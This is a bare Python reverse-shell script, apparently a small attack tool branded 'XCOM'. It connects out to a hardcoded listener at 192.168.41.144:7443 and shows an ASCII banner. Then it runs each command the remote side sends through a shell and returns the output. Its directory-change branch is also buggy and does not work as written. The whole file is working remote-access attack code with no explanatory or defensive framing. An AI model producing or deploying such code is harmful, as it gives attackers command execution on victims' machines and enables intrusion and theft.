import os,socket,subprocess;

RHOST = "192.168.41.144"
RPORT= 7443

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST,RPORT))
s.send(b'''Connected 
                                                         
 _  _  ___  _____  __  __   
( \/ )/ __)(  _  )(  \/  )  
 )  (( (__  )(_)(  )    (   
(_/\_)\___)(_____)(_/\/\_)  

''')
s.send(str.encode(os. getcwd()+"\\"))
while True :
    data= s.recv(2048)
    print(str(data,"utf-8"))
    if(str(data,"utf-8")== 'byebye\n'):
        s.send(b'''Connected 
        XCOM will back soon                                                        
        _  _  ___  _____  __  __   
        ( \/ )/ __)(  _  )(  \/  )  
        )  (( (__  )(_)(  )    (   
        (_/\_)\___)(_____)(_/\/\_)  

        ''')
        s.close()
        exit()
    if(data[:2]== 'cd'):
        if (os.path.exists(str(data[:3]).replace('\n',''))):
            os.chdir(str(data[:3]).replace('\n',''))
            s.send(str.encode(os. getcwd()+"\\"))
    else:
        process =subprocess.Popen(str(data,"utf-8"), shell= True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        out = process.stdout.read()+process.stderr.read()
        s.send(out)
        s.send(str.encode(os. getcwd()+"\\"))

    #process.stdout.read()+ process.stderr.read()




